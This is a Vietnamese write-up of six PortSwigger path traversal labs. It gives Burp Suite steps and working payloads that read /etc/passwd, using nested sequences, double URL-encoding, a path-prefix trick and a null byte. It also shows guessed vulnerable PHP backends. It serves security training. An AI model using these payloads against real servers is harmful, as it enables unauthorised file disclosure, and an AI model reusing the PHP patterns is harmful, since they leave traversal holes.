# Path traversal

## **Lab: File path traversal, simple case**

[Lab: File path traversal, simple case | Web Security Academy](https://portswigger.net/web-security/file-path-traversal/lab-simple)

- Thực hiện vào  trang chủ
- Trong phần mềm Burpsuite, bắt request gửi tới API `GET /image?filename=` chuyển sang tab Repeater.
    
    ![image.png](Path%20traversal/image.png)
    
- Thực hiện thay đổi tham số `filename` thành payload sau. Quan sát thấy đọc file thành công. Hoàn thành giải lab
    
    ```jsx
    ../../../../../../../../../../../../etc/passwd
    ```
    
    ![image.png](Path%20traversal/image%201.png)
    
    ![image.png](Path%20traversal/image%202.png)
    

## **Lab: File path traversal, traversal sequences blocked with absolute path bypass**

[Lab: File path traversal, traversal sequences blocked with absolute path bypass | Web Security Academy](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)

- Thực hiện truy cập vào trang chủ
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `GET /image?filename=` , chuyển request này sang tab Repeater
    
    ![image.png](Path%20traversal/image%203.png)
    
- Thực hiện thay đổi tham số `filename` bằng payload sau nhưng không thể đọc được file
    
    ```jsx
    ../../../../../../../../../../../../etc/passwd
    ```
    
    ![image.png](Path%20traversal/image%204.png)
    
- Thử đường dẫn tuyệt đối, quan sát thấy file được trả về
    - Payload
        
        ```jsx
        /etc/passwd
        ```
        
    - Response trả về
        
        ![image.png](Path%20traversal/image%205.png)
        
- Hoàn thành giải lab
    
    ![image.png](Path%20traversal/image%206.png)
    

## **Lab: File path traversal, traversal sequences stripped non-recursively**

[Lab: File path traversal, traversal sequences stripped non-recursively | Web Security Academy](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)

- Thực hiện truy cập trang chủ
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `GET /image?filename=` . Chuyển request này sang tab Repeater.
    
    ![image.png](Path%20traversal/image%207.png)
    
- Thực hiện truyền payload dạng `../../../../../etc/passwd` và cả đường dẫn tuyệt đối `/etc/passwd` đều không được. Tuy nhiên, thì vẫn đọc được file ảnh ban đầu → dev đã thực hiện bỏ đi phần traversal
    
    ![image.png](Path%20traversal/image%208.png)
    
- Có thể dev sẽ code như sau:
    
    ```php
    <?php
    $base_dir = 'images/';
    
    $filename = $_GET['filename'];
    
    $safe_filename = str_replace('../', '', $filename);
    
    $path = $base_dir . $safe_filename;
    
    if (file_exists($path)) {
        echo "Đang hiển thị file: " . htmlspecialchars($safe_filename) . "<br>";
    } else {
        echo "Không tìm thấy file!";
    }
    ?>
    ```
    
- Như vậy có thể bypass bằng cách dùng payload sau:
    - Payload
        
        ```php
        ..//....//....//....//....//....//....//....//....//....//....//....//etc//passwd
        ```
        
    - Payload sau khi qua hàm xử lý
        
        ```php
        ../../../../../../../../../../../../etc/passwd
        ```
        
- Thực hiện đọc file bằng payload trên. Hoàn thành việc giải lab
    
    ![image.png](Path%20traversal/image%209.png)
    
    ![image.png](Path%20traversal/image%2010.png)
    

## **Lab: File path traversal, traversal sequences stripped with superfluous URL-decode**

[Lab: File path traversal, traversal sequences stripped with superfluous URL-decode | Web Security Academy](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

- Thực hiện truy cập vào trang chủ
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `GET /image?filename=` . Chuyển request này sang tab Repeater.
    
    ![image.png](Path%20traversal/image%2011.png)
    
- Khi sử dụng các payload thường, nested payload thì vẫn không được có thể là server đã tự chặn những path không hợp lệ gây nguy hiểm → thử encode 2 lần (vì phía server sẽ decode trước và vẫn có thể sẽ chăn vì xuất ký tự không hợp lệ) và có thể dev vô tình decode thêm lần nữa nhờ vậy payload vẫn được thực thi
    - Payload
        
        ```php
        ..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
        ```
        
    - Response
        
        ![image.png](Path%20traversal/image%2012.png)
        
- Hoàn thành giải lab
    
    ![image.png](Path%20traversal/image%2013.png)
    

## **Lab: File path traversal, validation of start of path**

[Lab: File path traversal, validation of start of path | Web Security Academy](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)

- Truy cập vào trang chủ
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `GET /image?filename=` . Chuyển request này sang tab Repeater.
    
    ![image.png](Path%20traversal/image%2014.png)
    
- Nếu như gửi trực tiếp payload thì server sẽ trả về 400. Tuy nhiên, khi thêm `/var/www/images` thì path traversal được. Đoạn code phía backend dev sẽ xử lý như sau:
    
    ```php
    <?php
    $expected_path = '/var/www/images/';
    
    $filename = $_GET['filename'];
    
    if (strpos($filename, $expected_path) === 0) {
        
         if (file_exists($filename)) {
            header('Content-Type: image/jpeg'); 
            readfile($filename);
        } else {
            echo "File không tồn tại.";
        }
        
    } else {
        echo "Yêu cầu bị từ chối: Đường dẫn phải bắt đầu bằng " . htmlspecialchars($expected_path);
    }
    ?>
    ```
    
- Như vậy, thì chúng ta hoàn toàn có thể bypass được cơ chế check này bằng payload sau và đọc được file.
    - Payload
        
        ```php
        /var/www/images/../../../../../../../../../../../../../../etc/passwd
        ```
        
    - Response
        
        ![image.png](Path%20traversal/image%2015.png)
        
- Hoàn thành việc giải lab
    
    ![image.png](Path%20traversal/image%2016.png)
    

## **Lab: File path traversal, validation of file extension with null byte bypass**

[Lab: File path traversal, validation of file extension with null byte bypass | Web Security Academy](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

- Truy cập vào trang chủ
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `GET /image?filename=` . Chuyển request này sang tab Repeater.
    
    ![image.png](Path%20traversal/image%2017.png)
    
- Thực hiện gửi payload sau thì có thể thực hiện đọc file.
    - Payload
        
        ```php
        ../../../../../../../../../../../../../../../../../../../../../etc/passwd%00.jpg
        ```
        
    - Response
        
        ![image.png](Path%20traversal/image%2018.png)
        
- Code phía backend, dev xử lý như sau:
    
    ```php
    <?php
    $base_dir = 'images/';
    
    $filename = $_GET['filename'];
    
    if (str_ends_with($filename, '.png')) {
        
        $path = $base_dir . $filename;
    
        
        if (file_exists($path)) {
            header('Content-Type: image/png');
            readfile($path); 
        } else {
            echo "File không tồn tại.";
        }
    
    } else {
        echo "Chỉ cho phép định dạng .png";
    }
    ?>
    ```
    
- Hoàn thành việc giải lab
    
    ![image.png](Path%20traversal/image%2019.png)